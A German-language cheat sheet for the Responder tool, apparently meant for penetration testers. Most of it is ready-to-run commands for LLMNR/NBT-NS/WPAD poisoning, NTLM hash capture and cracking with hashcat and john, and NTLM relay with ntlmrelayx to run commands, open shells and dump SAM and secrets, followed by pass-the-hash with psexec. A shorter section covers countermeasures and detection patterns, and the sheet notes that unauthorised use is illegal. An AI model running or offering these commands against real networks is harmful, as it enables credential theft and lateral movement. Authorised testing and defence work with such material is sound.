Grundlagen & Start
Vollständiger Start (empfohlen)
responder -I eth0 -rdwP
Minimaler Start
responder -I eth0
Interface angeben
responder -I eth0 # Netzwerk-Interface responder -I ens33 # VMware-Interface
Wichtige Flags
-r # NBNS-Antworten aktivieren -d # DHCP-Poisoning (Broadcast) -w # WPAD-Proxy starten -P # ProxyAuth-Mode (Basic Auth)
Analyze-Mode (nur lauschen)
responder -I eth0 -A
Hinweis: Responder muss als root laufen. Im Analyze-Mode (-A) werden keine Antworten gesendet — ideal zur sicheren Aufklärung.
⚙️
Protokoll-Optionen
LM-Hashes anfordern (ältere Windows)
responder -I eth0 --lm
Extended Session Security deaktivieren
responder -I eth0 --disable-ess
Weitere Protokoll-Flags
-v # verbose Ausgabe -F # WPAD-Force-Auth -b # Basic HTTP-Auth (kein NTLM) -D # DHCP-DNS-Injection
WPAD auf alternativen Port
responder -I eth0 -w --wpad-port 8080
Kombinierter Angriff
responder -I eth0 -rdwFP --lm
--disable-ess deaktiviert Extended Session Security — erhöht Kompatibilität mit älteren Clients, kann aber die Sicherheit von Hashes reduzieren.

Captured Hashes
Log-Verzeichnis
/usr/share/responder/logs/
Dateiformat der Logs
SMB-NTLMv2-SSP-192.168.1.50.txt HTTP-NTLMv2-192.168.1.50.txt
Alle Logs anzeigen / live verfolgen
ls /usr/share/responder/logs/ tail -f /usr/share/responder/logs/*.txt
NTLMv2-Hash-Format
# user::DOMAIN:challenge:hash:clientchallenge jdoe::CORP:1122334455667788:aabbcc...:
Hashes mit hashcat cracken
hashcat -m 5600 hashes.txt rockyou.txt
Hashes mit john cracken
john --format=netntlmv2 hashes.txt \ --wordlist=/usr/share/wordlists/rockyou.txt
Hashcat -m 5600 ist für NTLMv2 (NetNTLMv2). Für NTLMv1 gilt -m 5500. Das richtige Format prüfen, bevor der Crack gestartet wird.
📄
Konfiguration
Config-Datei
/etc/responder/Responder.conf
Protokolle aktivieren / deaktivieren
SMB = On HTTP = On HTTPS = On FTP = On LDAP = On
Auf spezifische IP antworten
RespondTo = 192.168.1.100
IP aus Antworten ausschließen
DontRespondTo = 192.168.1.1
Festes NTLM-Challenge setzen
Challenge = 1122334455667788
Session-Logging aktivieren
SessionLog = On
Challenge auf einen festen Wert setzen ermöglicht Rainbow-Table-Angriffe auf NTLMv1 — bei NTLMv2 hat das keinen praktischen Vorteil.

NTLM-Relay mit ntlmrelayx
Voraussetzung prüfen (SMB Signing)
nmap --script smb2-security-mode \ -p 445 192.168.1.0/24
Responder ohne eigene SMB/HTTP-Server
responder -I eth0 \ --no-http-server --no-smb-server
ntlmrelayx auf Ziel (parallel)
ntlmrelayx.py -smb2support \ -t smb://192.168.1.100
Befehl auf Ziel ausführen
ntlmrelayx.py -smb2support \ -t smb://192.168.1.100 \ -c "whoami"
Interaktive Shell öffnen
ntlmrelayx.py -smb2support \ -t smb://192.168.1.100 --interactive
SAM-Datenbank dumpen
ntlmrelayx.py -smb2support \ -t smb://192.168.1.100 --sam
Voraussetzung: SMB Signing muss auf dem Ziel deaktiviert sein. Responder und ntlmrelayx laufen gleichzeitig in separaten Terminals.

WPAD-Angriff
WPAD-Server aktivieren
responder -I eth0 -w
Force-Auth für alle Browser
responder -I eth0 -wF
ProxyAuth erzwingen (NTLM-Hashes)
responder -I eth0 -wFP
Automatisch gelieferte Datei
# wpad.dat wird von Responder # automatisch ausgeliefert # Browser fragt nach Proxy-Auth
Wirkungsweise
# 1. Browser sucht WPAD via LLMNR/NBT-NS # 2. Responder antwortet mit eigenem wpad.dat # 3. -F zwingt zur Authentifizierung # 4. -P → NTLM-Hash wird übertragen
WPAD-Angriff ist besonders effektiv in Unternehmensnetzwerken ohne zentrale WPAD-Konfiguration. Fast jeder Browser unterstützt automatische Proxy-Erkennung.
🔗
MultiRelay & Pivot
MultiRelay (Responder-Paket, älter)
MultiRelay.py -t 192.168.1.100 -u ALL
Interaktive Shell via ntlmrelayx
ntlmrelayx.py --smb2support \ -t smb://192.168.1.100 --interactive
Auf offene Shell verbinden (smbclient)
smbclient //127.0.0.1/C$ \ -U '' -N -p 11000
Pass-the-Hash nach Relay
# NTLM-Hash aus SAM-Dump verwenden: impacket-psexec -hashes :HASH \ Administrator@192.168.1.100
Secretsdump via Relay
ntlmrelayx.py -smb2support \ -t 192.168.1.100 \ -e secretsdump.py
Pass-the-Hash folgt häufig nach einem erfolgreichen NTLM-Relay. NTLM-Hashes aus dem SAM-Dump können direkt für laterale Bewegung genutzt werden.
🛡️
Erkennung & Gegenmaßnahmen
SMB Signing erzwingen (PowerShell)
Set-SmbServerConfiguration \ -RequireSecuritySignature $true
LLMNR deaktivieren (GPO)
# Gruppenrichtlinie: # Computer Config → Admin Templates # → Network → DNS Client # → "Turn off Multicast Name Resolution"
NBT-NS deaktivieren (Registry)
# HKLM\SYSTEM\CurrentControlSet\ # Services\NetBT\Parameters\Interfaces # → NetbiosOptions = 2
WPAD deaktivieren
# Winhttp → WpadAutoDetect = 0 # oder via GPO: Disable WPAD
Erkennung via Netzwerk-IDS
# Anomalie-Muster: # - Broadcast-Antworten auf LLMNR # - Unbekannte NBNS-Responder # - WPAD-Anfragen an interne Hosts
Wichtigste Maßnahme: SMB Signing und Deaktivierung von LLMNR/NBT-NS im gesamten Netz. Diese drei Maßnahmen zusammen machen Responder-Angriffe weitgehend unwirksam.

Quick Reference
Standard-Pentest-Befehl
responder -I eth0 -rdwP
Nur lauschen (kein Poisoning)
responder -I eth0 -A
Alle gesammelten Hashes cracken
hashcat -m 5600 \ /usr/share/responder/logs/*.txt \ /usr/share/wordlists/rockyou.txt
Relay-Setup (zwei Terminals)
# Terminal 1 — Responder: responder -I eth0 \ --no-http-server --no-smb-server # Terminal 2 — Relay: ntlmrelayx.py -smb2support \ -t smb://ZIEL --sam
Hash-Typ für hashcat
# NTLMv2 (NetNTLMv2): -m 5600 # NTLMv1 (NetNTLM): -m 5500 # NTHash (NTLM): -m 1000
Wichtig: Responder nur in autorisierten Umgebungen einsetzen. Der Einsatz in produktiven Netzwerken ohne Genehmigung ist illegal.
